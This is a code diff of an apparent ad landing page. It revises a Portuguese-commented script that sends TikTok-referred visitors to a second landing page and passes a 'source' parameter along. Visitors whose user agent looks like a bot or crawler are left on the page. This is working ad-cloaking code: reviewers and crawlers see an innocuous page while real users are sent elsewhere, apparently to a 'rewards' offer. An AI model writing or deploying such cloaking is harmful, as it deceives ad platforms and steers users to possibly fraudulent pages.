@@ -1400,8 +1400,8 @@ Edmonton AB</span></blockquote>
 <!-- warmup data end -->
 
 
-<script>
-      // Função para obter parâmetros da URL
+ <script>
+        // Função para obter parâmetros da URL
         function getParameterByName(name, url = window.location.href) {
             name = name.replace(/[\[\]]/g, '\\$&');
             var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
@@ -1411,21 +1411,28 @@ Edmonton AB</span></blockquote>
             return decodeURIComponent(results[2].replace(/\+/g, ' '));
         }
 
-        // Obter o valor do parâmetro "yyy"
+        // Capturar os parâmetros da URL
         var placementValue = getParameterByName('yyy');
+        var sourceValue = getParameterByName('source');
 
-        // Verificar se o valor é "TikTok" ou "Tiktok" (case-insensitive)
+        // Verificar se o valor de "yyy" é "TikTok" ou "Tiktok" (case-insensitive)
         if (placementValue && placementValue.toLowerCase() === 'tiktok') {
             // Verificar se é um navegador real (não bot)
             var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
 
             // Redirecionar apenas usuários reais
             if (!isBot) {
-                window.location.href = 'https://rewards-uplevel.vercel.app/target.html'; // Página do anúncio
+                // Construir a URL da segunda página com o valor de "source"
+                var segundaLandUrl = 'https://segunda-land.com';
+                if (sourceValue) {
+                    segundaLandUrl += '?source=' + encodeURIComponent(sourceValue);
+                }
+
+                // Redirecionar para a segunda página
+                window.location.href = segundaLandUrl;
             }
         }
-
-</script>
+    </script>
 
 
 
